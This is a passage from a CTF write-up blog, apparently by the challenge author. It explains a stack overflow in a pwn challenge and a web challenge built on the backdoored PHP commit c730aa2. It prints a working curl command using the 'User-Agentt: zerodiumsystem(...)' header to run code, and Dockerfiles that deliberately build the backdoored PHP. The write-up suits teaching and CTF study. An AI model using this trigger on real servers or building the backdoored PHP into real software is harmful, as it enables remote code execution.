+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">hashed_flag</span><span class="p">[</span><span class="mi">256</span><span class="p">][</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">attempts</span><span class="p">[</span><span class="mi">256</span><span class="p">][</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// 👈 (1)
+</span></span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">urandom</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">sprintf</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="s">&#34;attempt%02x_&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read_line</span><span class="p">(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">tmp</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Final</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">attempts</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">);</span> <span class="c1">// 👈 (2)
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">        <span class="nf">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">attempts</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// 👈 (3)
+</span></span></span><span class="line"><span class="cl">        <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">        <span class="n">tmp</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="p">.</span><span class="n">hashed_flag</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">hashed_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">correct_guesses</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">correct_guesses</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The root of the problem comes from the sizes of <code>ctx.attempts[i]</code>. Each of them is 16 bytes, which is exactly the size of a MD5 digest.</p>
+<p>Suppose that each MD5 digest of <code>attempt[k]_[guessed_flag]</code> consists of <em>no</em> null bytes. <code>ctx.attempts</code> is allocated 4096 bytes, and it consists of no null bytes after 256 rounds of (2) is performed. When the first time (3) is executed, <code>tmp</code> is <em>entirely</em> overwritten by <code>ctx.attempts</code>. Alas, the subsequent memory will be overwritten by <code>ctx.name</code>, too. With IDA, we can see that <code>correct_guesses</code> is 12 bytes after the end of <code>tmp</code>, this is snippeted from the decompiled <code>main</code> function of the binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">    <span class="n">Context</span> <span class="n">ctx</span><span class="p">;</span> <span class="c1">// [rsp-90h] [rbp-3098h]
+</span></span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span> <span class="c1">// [rsp+1FF0h] [rbp-1018h]
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i2</span><span class="p">;</span> <span class="c1">// [rsp+2FF4h] [rbp-14h] // 👈 The `i` used in the &#34;check&#34; loop
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i1</span><span class="p">;</span> <span class="c1">// [rsp+2FF8h] [rbp-10h] // 👈 The `i` used in the &#34;attempt&#34; loop
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">correct_guesses</span><span class="p">;</span> <span class="c1">// [rsp+2FFCh] [rbp-Ch]
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From above, <code>name[12:16]</code> overwrites <code>correct_guesses</code>. We can simply change that to a number higher than 128. Note that <code>name[4:8]</code> overwrites <code>i2</code>, which is the <code>i</code> for <code>ctx.hashed_flag[i][16] = 0</code>. That said <code>i</code> should be reasonable (for example, <code>-1</code>) so that the program would not crash after running this line. I used 13 <code>FF</code>'s as the name and that gains me the flag.</p>
+<h2 id="荊棘海--the-wilderness-web">荊棘海 / The Wilderness (Web)<a href="#荊棘海--the-wilderness-web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p><em>就在回望一刻總有哀</em><br>
+<em>世界已不再</em><br>
+<em>誰偏偏一再</em><br>
+<em>等待 到終於不記得等待</em></p>
+<p>Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox... What can go wrong?</p>
+<p>http://HOST:PORT/</p>
+<p>Attachments: <a href="https://github.com/samueltangz/ctf-archive-created/blob/master/20211112-hkcert-ctf/the-wilderness/public/Dockerfile"
+   
+   target="_blank" rel="noopener noreferrer" >Dockerfile</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>, <a href="https://github.com/samueltangz/ctf-archive-created/blob/master/20211112-hkcert-ctf/the-wilderness/public/index.php"
+   
+   target="_blank" rel="noopener noreferrer" >index.php</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>We are given a PHP file called <code>index.php</code> and a <code>Dockerfile</code>. The below code are their contents, and the goal is to read the flag in the comment of <code>index.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>It Works!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?php // hkcert21{***REDACTED***} ?&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">ARG</span> <span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt update <span class="o">&amp;&amp;</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip zlib1g-dev<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> <span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="nb">cd</span> php-src-* <span class="o">&amp;&amp;</span> ./buildconf <span class="o">&amp;&amp;</span> ./configure --with-zlib <span class="o">&amp;&amp;</span> make -j4<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> mv /tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php /bin<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> rm -rf /tmp/*<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> mkdir /var/www/html -p<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">COPY</span> index.php /var/www/html<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">USER</span><span class="w"> </span><span class="s">www-data</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/var/www/html</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0.0.0:80&#34;</span><span class="p">,</span> <span class="s2">&#34;-t&#34;</span><span class="p">,</span> <span class="s2">&#34;/var/www/html&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></div><h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The PHP code is so simple that it is trivially not vulnerable. The weakness comes from <code>Dockerfile</code>, where a backdoored PHP version is used. When we search the commit hash <code>c730aa2</code>, we can easily find pages mentioning the incident. Black Bauhinia have even shared the news on <a href="https://www.facebook.com/blackb6a/posts/225639876011690"
+   
+   target="_blank" rel="noopener noreferrer" >their Facebook page</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>. Well, they made a mistake: The header should be <code>User-Agentt</code> (instead of <code>User-Agent</code>).</p>
+<div class="alert warning">
+  <strong>Are you self-promoting?</strong> Yes! This is yet another shameless self-promotion of our Facebook page. Go like and share.
+</div>
+
+<p>One can easily get the flag with a little bit of Googling.</p>
+<pre class='language-bash command-line' data-output='2-4' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">curl http://HOST:28364/ -H &#34;User-Agentt: zerodiumsystem(&#39;cat index.php&#39;);&#34;   
+&lt;h1&gt;It Works!&lt;/h1&gt;
+&lt;?php // hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n} ?&gt;
+&lt;h1&gt;It Works!&lt;/h1&gt;</code>
+</pre>
+
+<h3 id="making-of">Making Of<a href="#making-of" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Although PHP was the first programming language I ever learned, I never understand how a PHP environment is set up. I was relying on softwares like <em>WampServer</em>. This time I crafted the <code>Dockerfile</code> entirely by myself, learning the process of building the PHP environment from the source code.</p>
+<p>This is the first edition of the <code>Dockerfile</code> I made. It works, but the backdoor isn't there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:focal-20210827</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">ARG</span> <span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt update<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> <span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="nb">cd</span> php-src-* <span class="o">&amp;&amp;</span> ./buildconf <span class="o">&amp;&amp;</span> ./configure <span class="o">&amp;&amp;</span> make -j4<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/var/www/html</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;/tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php&#34;</span><span class="p">,</span> <span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0.0.0:80&#34;</span><span class="p">,</span> <span class="s2">&#34;-t&#34;</span><span class="p">,</span> <span class="s2">&#34;/var/www/html&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></div><p>I referred to <a href="https://hub.docker.com/layers/vulhub/php/8.1-backdoor/images/sha256-5cbeb206dcda6c296bdc1e11f855073aa59dd68db8cfadb846a632727875a99a?context=explore"
+   
+   target="_blank" rel="noopener noreferrer" >Docker image of vulhub</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> to see what I was missing. After all, I just need to use the <code>zlib</code> module where the vulnerability is introduced, according to <a href="https://github.com/php/php-src/blob/c730aa26bd52829a49f2ad284b181b7e82a68d7d/ext/zlib/zlib.c#L365-L373"
+   
+   target="_blank" rel="noopener noreferrer" ><code>zlib.c</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>. It took me hours for debugging to introduce the bug. 🤷</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:focal-20210827</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">ARG</span> <span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt update<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip zlib1g-dev<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> <span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="nb">cd</span> php-src-* <span class="o">&amp;&amp;</span> ./buildconf <span class="o">&amp;&amp;</span> ./configure --with-zlib <span class="o">&amp;&amp;</span> make -j4<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/var/www/html</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;/tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php&#34;</span><span class="p">,</span> <span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0.0.0:80&#34;</span><span class="p">,</span> <span class="s2">&#34;-t&#34;</span><span class="p">,</span> <span class="s2">&#34;/var/www/html&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></div><p>Also, we of course are not exposing the root permission. Gotta fix that or players are will be nuking the challenge server. This is the final <code>Dockerfile</code> we have for now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:focal-20210827</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">ARG</span> <span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">RUN</span> apt update <span class="o">&amp;&amp;</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip zlib1g-dev<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> <span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span class="se">\
+</span></span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="nb">cd</span> php-src-* <span class="o">&amp;&amp;</span> ./buildconf <span class="o">&amp;&amp;</span> ./configure --with-zlib <span class="o">&amp;&amp;</span> make -j4<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> mv /tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php /bin<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> rm -rf /tmp/*<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">USER</span><span class="w"> </span><span class="s">www-data</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/var/www/html</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0.0.0:80&#34;</span><span class="p">,</span> <span class="s2">&#34;-t&#34;</span><span class="p">,</span> <span class="s2">&#34;/var/www/html&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></div><h2 id="神奇的糊塗魔藥--potion-of-ciphermath-misc">神奇的糊塗魔藥 / Potion of Ciphermath (Misc)<a href="#神奇的糊塗魔藥--potion-of-ciphermath-misc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-2">Challenge Summary<a href="#challenge-summary-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p><em>無視道與理 是與非非 盼待往天飛 卻要撞地</em><br>
+<em>在忙亂之中找到勇氣 一片塵埃中起飛</em></p>
+<p>Let's speak in math! Of course we can make it harder by encrypting the numbers, too.</p>
+<p><code>nc HOST PORT</code></p>
+<p>Attachments: <a href="https://github.com/samueltangz/ctf-archive-created/blob/master/20211112-hkcert-ctf/potion-of-ciphermath/public/chall.py"
+   
+   target="_blank" rel="noopener noreferrer" >chall.py</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>When connected to the server, a 512-bit prime $p$ and a secret $x \in [0, p)$ is generated. Denote $\text{Enc}$ be an encryption function that encrypts a number $n \in [0, 2^{512})$ into a 64-byte ciphertext. We can call the below oracles in a total of 4096 times:</p>
+<ol>
+<li><strong>[Get Secret]</strong> Return $\text{Enc}(x \oplus p)$.</li>
